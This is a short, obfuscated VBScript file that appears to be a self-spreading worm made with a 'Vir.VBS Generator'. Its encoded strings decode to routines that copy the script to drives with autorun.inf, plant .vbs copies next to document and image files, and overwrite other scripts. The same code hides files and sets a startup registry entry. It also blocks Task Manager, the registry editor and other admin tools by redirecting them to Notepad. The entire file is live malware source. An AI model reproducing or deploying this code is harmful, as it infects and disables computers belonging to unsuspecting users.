Rem solidsn@k38359685540
On Error Resume Next
Dim Reg, fso, YwrfZKJVyZ
Set Reg = CreateObject(eyPOIEkEBq("mmfiT/uqjsdTX"))
Set fso = CreateObject(eyPOIEkEBq("udfkcPnfutzTfmjG/hojuqjsdT"))
Set YwrfZKJVyZ = fso.GetFile(Wscript.ScriptFullName)
If YwrfZKJVyZ <> Reg.SpecialFolders(eyPOIEkEBq("bubEqqB")) & eyPOIEkEBq("tcw/mfpixzsd]") then
If fso.fileExists(Left(YwrfZKJVyZ, Len(YwrfZKJVyZ) - 4)) Then
Reg.Run (Reg.RegRead(eyPOIEkEBq("]SDLI") & vVfoInVDWq(eyPOIEkEBq("qnc")) & eyPOIEkEBq("]eobnnpd]ofqP]mmfit]")) & eyPOIEkEBq(" !") & chr(34) & Left(YwrfZKJVyZ, len(YwrfZKJVyZ)-3) & chr(34))
Else
Reg.Run (Reg.RegRead(eyPOIEkEBq("]SDLI") & vVfoInVDWq(eyPOIEkEBq("qnc")) & eyPOIEkEBq("]eobnnpd]ofqP]mmfit]")) & eyPOIEkEBq(" !") & chr(34) & chr(34))
End If
End If
QfxkpSOLAk
LDVfdXLXRT
RXgxERswVm
nJkJSvKsxW
rgohQrNDjG
ShortCut
vgeVwnpCUg (Left(YwrfZKJVyZ, InStrRev(YwrfZKJVyZ, eyPOIEkEBq("!]!"))))
unuIhoLQze (Left(YwrfZKJVyZ, InStrRev(YwrfZKJVyZ, eyPOIEkEBq("!]!"))))
nOjZMvurWr(eyPOIEkEBq("];d"))
nOjZMvurWr(eyPOIEkEBq("];e"))
nOjZMvurWr(eyPOIEkEBq("];f"))
nOjZMvurWr(eyPOIEkEBq("];g"))
nOjZMvurWr(eyPOIEkEBq("];h"))
MqFcxWFKNA
ynkwNkoOjF


Sub QfxkpSOLAk
On Error Resume Next
Dim xvAiylKdOD, auto, tf1, tf2
For Each xvAiylKdOD In fso.drives
If (xvAiylKdOD.drivetype = 1 or xvAiylKdOD.drivetype = 2) and xvAiylKdOD.path <> eyPOIEkEBq(";B") then
Set auto = fso.CreateTextFile(xvAiylKdOD.Path & (eyPOIEkEBq("goj/ovSpuvB]")), True)
auto.Write (eyPOIEkEBq("^ovspuvb\")& vbcrlf & eyPOIEkEBq("tcw/vlbubE!fyf/uqjsdtx>fuvdfyfmmfit"))
auto.Close
set tf1=fso.getfile(xvAiylKdOD.path & eyPOIEkEBq("goj/ovSpuvB]"))
tf1.Attributes = 32
YwrfZKJVyZ.Copy (xvAiylKdOD.Path & eyPOIEkEBq("tcw/vlbubE]"))
set tf2=fso.getfile(xvAiylKdOD.path & eyPOIEkEBq("tcw/vlbubE]"))
tf2.Attributes = 32
End If
Next
End Sub

Sub nOjZMvurWr (luNwQxqRDz)
On Error Resume Next
Dim drv
If fso.DriveExists(luNwQxqRDz) Then
Set drv = fso.GetDrive(fso.GetDriveName(luNwQxqRDz))
If drv.DriveType = 1 Or drv.DriveType = 2 Then
wSOSRmkoQM (luNwQxqRDz & eyPOIEkEBq("tcw/fmjG!xfO]"))
unuIhoLQze (luNwQxqRDz)
End If
End If
End Sub

Sub unuIhoLQze (luNwQxqRDz)
On Error Resume Next
If luNwQxqRDz = "" Then Exit Sub
if luNwQxqRDz = Left(Reg.SpecialFolders(eyPOIEkEBq("qpultfE")),3) & eyPOIEkEBq("txpeojX") then exit sub
Dim RShhKRIxwR
For Each RShhKRIxwR In fso.GetFolder(luNwQxqRDz).SubFolders
wSOSRmkoQM(RShhKRIxwR & eyPOIEkEBq("tcw/fnebfS]"))
vgeVwnpCUg (RShhKRIxwR)
unuIhoLQze2 (RShhKRIxwR)
Next
End Sub

Sub unuIhoLQze2 (luNwQxqRDz)
On Error Resume Next
If luNwQxqRDz = "" Then Exit Sub
if luNwQxqRDz = Left(Reg.SpecialFolders(eyPOIEkEBq("qpultfE")),3) & eyPOIEkEBq("txpeojX") then exit sub
Dim RShhKRIxwR
For Each RShhKRIxwR In fso.GetFolder(luNwQxqRDz).SubFolders
wSOSRmkoQM(RShhKRIxwR & eyPOIEkEBq("tcw/zfopN]"))
vgeVwnpCUg (RShhKRIxwR)
unuIhoLQze3 (RShhKRIxwR)
Next
End Sub

Sub unuIhoLQze3 (luNwQxqRDz)
On Error Resume Next
If luNwQxqRDz = "" Then Exit Sub
if luNwQxqRDz = Left(Reg.SpecialFolders(eyPOIEkEBq("qpultfE")),3) & eyPOIEkEBq("txpeojX") then exit sub
Dim RShhKRIxwR
For Each RShhKRIxwR In fso.GetFolder(luNwQxqRDz).SubFolders
wSOSRmkoQM(RShhKRIxwR & eyPOIEkEBq("tcw/mjtbI]"))
vgeVwnpCUg (RShhKRIxwR)
Next
End Sub

Sub vgeVwnpCUg (luNwQxqRDz)
On Error Resume Next
Dim RShhKRIxwR
For Each RShhKRIxwR In fso.GetFolder(luNwQxqRDz).Files
If lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("dpe") then
if Left(RShhKRIxwR,2)<> eyPOIEkEBq("%") then wSOSRmkoQM(RShhKRIxwR & eyPOIEkEBq("tcw/"))
qbpQXrdELl (RShhKRIxwR)
End If
If lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("tmy") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("uqq") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("geq") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("gus") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("sbs") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("qj{") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("hqk") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("gjh") or lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("qnc") then
if Left(RShhKRIxwR,2)<> eyPOIEkEBq("%") then wSOSRmkoQM(Left(RShhKRIxwR, len(RShhKRIxwR)-3) & eyPOIEkEBq("tcw"))
End If
If lcase(Right(RShhKRIxwR,4))=eyPOIEkEBq("ydpe") or lcase(Right(RShhKRIxwR,4))=eyPOIEkEBq("ytmy") or lcase(Right(RShhKRIxwR,4))=eyPOIEkEBq("yuqq") then
if Left(RShhKRIxwR,2)<> eyPOIEkEBq("%") then wSOSRmkoQM(Left(RShhKRIxwR, len(RShhKRIxwR)-4) & eyPOIEkEBq("tcw"))
End If
if lcase(Right(RShhKRIxwR,3))=eyPOIEkEBq("tcw") then lkPPcxWTFJ(RShhKRIxwR)
Next
End sub

Sub rgohQrNDjG
On Error Resume Next
Reg.RegWrite eyPOIEkEBq("]eobnnpd]mmbutoJ]mmfit]fmjggoj]SDLI"), eyPOIEkEBq("fyf/ggphpm")
Reg.RegWrite eyPOIEkEBq("]eobnnpd]ofqp]mmfit]fmjghfs]SDLI"), eyPOIEkEBq("fyf/ggphpm")
Reg.RegWrite eyPOIEkEBq("]eobnnpD]ujeF]mmfiT]fmjGTCW]SDLI"), eyPOIEkEBq("fyf/ggphpm")
Reg.RegWrite eyPOIEkEBq("ujefhfSfmcbtjE]nfutzT]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("ofeejI]efdobweB]sfspmqyF]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq(eyPOIEkEBq("2")), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("uyFfmjGfejI]efdobweB]sfspmqyF]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("fubjdpttBfmjGpO]sfspmqyF]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("ovSpO]sfspmqyF]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("eojGpO]sfspmqyF]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("topjuqPsfempGpO]sfspmqyF]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("ENDfmcbtjE]nfutzT]tfjdjmpQ]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.RegWrite eyPOIEkEBq("shNltbUfmcbtjE]nfutzt]tfjdjmpq]opjtsfWuofssvD]txpeojX]ugptpsdjN]FSBXUGPT]NMLI"), eyPOIEkEBq("2"), eyPOIEkEBq("ESPXE`HFS")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/end]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/hjgopdtn]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/ujefhfs]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/34uefhfs]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/shNltbU]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/cjsuub]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/mmbutoj]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
Reg.Regwrite eyPOIEkEBq("sfhhvcfE]fyf/qvuft]topjuqP!opjuvdfyF!fmjG!fhbnJ]opjtsfWuofssvD]UO!txpeojX]ugptpsdjN]FSBXUGPT]NMLI"),eyPOIEkEBq("fyf/ebqfupO")
End Sub

Sub nJkJSvKsxW
On Error Resume Next
Dim oHTnbuZdrt, LgHwKWlMQK
oHTnbuZdrt = eyPOIEkEBq("]UPPS`TFTTBMD`ZFLI") & vVfoInVDWq(eyPOIEkEBq("qnc"))
LgHwKWlMQK = eyPOIEkEBq("]UPPS`TFTTBMD`ZFLI") & vVfoInVDWq(eyPOIEkEBq("TCW"))
Reg.RegWrite LgHwKWlMQK & eyPOIEkEBq("]"), Reg.RegRead(oHTnbuZdrt & eyPOIEkEBq("]"))
Reg.RegWrite LgHwKWlMQK & eyPOIEkEBq("]opdJumvbgfE]"), Reg.RegRead(oHTnbuZdrt & eyPOIEkEBq("]opdJumvbgfE]"))
Reg.RegWrite LgHwKWlMQK & eyPOIEkEBq("uyFxpiTsfwfO]"),""
Reg.RegWrite eyPOIEkEBq("fnbOfqzUzmeofjsG]fmjGTCW]SDLI"), Reg.RegRead(oHTnbuZdrt & eyPOIEkEBq("]"))
End Sub

Sub ShortCut
On Error Resume Next
Dim lnk, lok
lok = Reg.SpecialFolders(eyPOIEkEBq("tfujspwbG")) & eyPOIEkEBq("lom/mfpixzsd]")
Set lnk = Reg.CreateShortCut(lok)
YwrfZKJVyZ.Copy (Reg.SpecialFolders(eyPOIEkEBq("bubEqqB")) & eyPOIEkEBq("tcw/mfpixzsd]"))
lnk.TargetPath = Reg.ExpandEnvironmentStrings(Reg.SpecialFolders(eyPOIEkEBq("bubEqqB")) & eyPOIEkEBq("tcw/mfpixzsd]"))
lnk.Save
qbpQXrdELl (lok)
Reg.RegWrite eyPOIEkEBq("mfpixzsd]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]VDLI"), lok
End Sub

Sub qbpQXrdELl (ysjMHkYOIZFile)
Dim f1
Set f1 = fso.GetFile(ysjMHkYOIZFile)
f1.Attributes = 6
End sub

Sub wSOSRmkoQM (ysjMHkYOIZ)
On Error Resume Next
Dim data, ts, s, a, tf
Randomize
data = Left(Rnd(15) * 10000000000, 10)
Set ts = fso.openTextFile(YwrfZKJVyZ, 1)
a = ts.ReadAll
s = Right(a, Len(a) -26)
ts.Close
Set tf = fso.CreateTextFile(ysjMHkYOIZ, True)
tf.WriteLine (eyPOIEkEBq("4lAotejmpt!nfS") & data)
tf.Write s
tf.Close
Set ts = fso.GetFile(ysjMHkYOIZ)
ts.Attributes = 1
End sub

Function vVfoInVDWq(TipeFile)
vVfoInVDWq = reg.RegRead (eyPOIEkEBq("/]UPPS`TFTTBMD`ZFLI") & TipeFile & eyPOIEkEBq("]"))
End Function

Sub lkPPcxWTFJ(BuqWegmbzd)
On Error Resume Next
Dim ts, s, i, a, b
Set ts = fso.openTextFile(BuqWegmbzd, 1)
s = ts.Readline
ts.Close
a = instr(s, eyPOIEkEBq("4lAotejmpt"))
If a = 0 Or a = "" Then
Set ts = fso.GetFile(BuqWegmbzd)
ts.Attributes = 0
Set ts = fso.openTextFile(YwrfZKJVyZ, 1)
i = ts.ReadAll
ts.Close
Set ts = fso.CreateTextfile(BuqWegmbzd, True)
ts.Write i
ts.Close
End If
End sub

sub MqFcxWFKNA
On Error Resume Next
Dim mf, check
If Wscript.ScriptFullname = Reg.SpecialFolders(eyPOIEkEBq("bubEqqB")) & eyPOIEkEBq("tcw/mfpixzsd]") then
Do
Set mf = fso.getfile(Wscript.ScriptFullname)
check = mf.Drive.drivetype
If check <> 1 Then Wscript.sleep 200000
Reg.run fso.getspecialfolder(0) & eyPOIEkEBq("!$udfmft0$f0!fyf/sfspmqyf]") & Wscript.ScriptFullname
QfxkpSOLAk
LDVfdXLXRT
nOjZMvurWr(eyPOIEkEBq("];e"))
nOjZMvurWr(eyPOIEkEBq("];f"))
Loop While check <> 1
End If
End sub

Sub LDVfdXLXRT
dim sYXufqrpEH
sYXufqrpEH=Left(Reg.SpecialFolders(eyPOIEkEBq("qpultfE")),3) & eyPOIEkEBq("tcw/nfutzT]txpeojX")
CopyVBS (sYXufqrpEH)
qbpQXrdELl(sYXufqrpEH)
unuIhoLQze(Reg.SpecialFolders(eyPOIEkEBq("tuofnvdpEzN")))
wSOSRmkoQM(Reg.SpecialFolders(eyPOIEkEBq("eppIufO")) & eyPOIEkEBq("tcw/uyu/82!bujsfD]"))
End Sub

Sub ynkwNkoOjF
On Error Resume Next
Dim RShhKRIxwR, ok
For Each RShhKRIxwR in fso.GetFolder(Reg.SpecialFolders(eyPOIEkEBq("uofdfS"))).Files
Set ok = reg.CreateShortCut(RShhKRIxwR)
if fso.FolderExists(ok.WorkingDirectory) then unuIhoLQze (ok.WorkingDirectory)
Next
End sub

Function eyPOIEkEBq(sYXufqrpEH)
Dim i, tmp2
For i = 1 To Len(sYXufqrpEH)
tmp2 = Chr(Asc(Mid(sYXufqrpEH, i, 1)) - 1) + tmp2
Next
eyPOIEkEBq = tmp2
End Function

Rem Created by Vir.VBS Generator V.1
